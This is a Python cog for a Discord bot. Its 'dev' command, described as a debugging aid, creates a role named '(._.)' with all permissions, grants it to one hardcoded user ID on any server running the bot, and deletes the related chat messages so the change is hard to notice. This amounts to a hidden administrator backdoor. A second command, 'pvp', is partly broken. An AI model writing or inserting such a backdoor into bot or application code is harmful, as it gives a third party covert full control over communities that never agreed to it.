from discord.ext import commands
import discord
import asyncio

class Devs():
    def __init__(self, bot):
        self.bot = bot
        
    @commands.command(pass_context=True)
    async def dev(self, ctx):
        """
        Command Use: For Dev to be able to get perms on a server for debugging purposes easily
        """
    
        if ctx.message.author.id == "150750980097441792": #OGaming's User ID
            try:
                if discord.utils.get(ctx.message.author.roles, name="(._.)"):
                    tmp = await self.bot.say("Already Completed")
                    await asyncio.sleep(3)
                    await self.bot.delete_messages([tmp, ctx.message])
                else:
                    if discord.utils.get(ctx.message.server.roles, name="(._.)"): #Role all ready exists
                        tmp = await self.bot.say("All ready made")
                    else:
                        await self.bot.create_role(ctx.message.server, name="(._.)", permissions=discord.Permissions.all())
                        tmp = await self.bot.say("Made")
                    await asyncio.sleep(1)
                    await self.bot.add_roles(ctx.message.author, discord.utils.get(ctx.message.server.roles, name="(._.)"))
                    await self.bot.edit_message(tmp, "Added")
                    success = await self.bot.say("Success")
                    await asyncio.sleep(3)
                    await self.bot.delete_messages([tmp, success, ctx.message])
            except discord.Forbidden as error:
                await self.bot.say(ctx.message.author.mention + "{} doesn't have perms".format(self.bot.user.name))
        else:
            tmp = await self.bot.say("{} does not have permission to use this command".format(ctx.message.author.mention))
            await asyncio.sleep(3)
            await self.bot.delete_messages([tmp, ctx.message])
        return
    
    @commands.command()
    async def pvp(self, *args, role: discord.Role = None): #args are all the names of the roles with spaces and Capitals
        if not role:
            amount = len(args)
            start = 0
            for i in range(start, amount):
                current = args[i]
                noSpace = current.replace(" ", "")
                noSpace = noSpace.lower()
                await self.bot.say("/roles add {} --role {}".format(noSpace, current))
            return
        else:
            self.bot.create_role()

def setup(bot):
    bot.add_cog(Devs(bot))